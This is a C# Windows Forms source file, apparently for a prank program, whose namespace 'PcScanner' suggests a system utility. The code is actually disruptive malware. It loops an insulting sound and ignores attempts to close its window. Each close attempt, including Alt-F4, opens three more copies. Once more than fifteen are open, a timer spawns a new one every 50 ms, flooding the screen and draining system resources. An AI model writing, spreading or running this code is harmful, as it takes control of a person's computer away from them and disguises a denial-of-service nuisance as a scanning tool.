using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PcScanner
{
    public partial class PCMini : Form
    {
        bool ALT_F4 = false;
        public PCMini()
        {
            InitializeComponent();
        }

        private void PCMini_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (ALT_F4)
            {
                label1.Text = "Alt-F4 still calls the same event as exiting\nnormally stupid idiot stupid!";
            }
            e.Cancel = true;
            PCMini pc = new PCMini();
            pc.Show();
            PCMini pc2 = new PCMini();
            pc2.Show();
            PCMini pc3 = new PCMini();
            pc3.Show();
        }

        private void PCMini_KeyDown(object sender, KeyEventArgs e)
        {
            ALT_F4 = (e.KeyCode.Equals(Keys.F4) && e.Alt == true);
        }

        private void PCMini_Load(object sender, EventArgs e)
        {
            SoundPlayer sp = new SoundPlayer();
            sp.SoundLocation = @".\stupididiotstwopid.wav";
            sp.PlayLooping();
            Point rand = new Point();
            rand.X = randomInt(0, Screen.PrimaryScreen.Bounds.Width - Size.Width);
            rand.Y = randomInt(0, Screen.PrimaryScreen.Bounds.Height - Size.Height);
            Location = rand;
            if (Application.OpenForms.Count > 15)
            {
                InitTimer();
            }
        }
        private System.Windows.Forms.Timer timer1;
        public void InitTimer()
        {
            timer1 = new System.Windows.Forms.Timer();
            timer1.Tick += new EventHandler(timer1_Tick);
            timer1.Interval = 50;
            timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            PCMini pc = new PCMini();
            pc.Show();
        }
        public int randomInt(int a, int b)
        {
            int number = GetThreadRandom().Next(a - 1, b + 1);
            return number;
        }
        private static int seed = Environment.TickCount;

        private static ThreadLocal<Random> randomWrapper = new ThreadLocal<Random>
            (() => new Random(Interlocked.Increment(ref seed)));

        public static Random GetThreadRandom()
        {
            return randomWrapper.Value;
        }
    }
}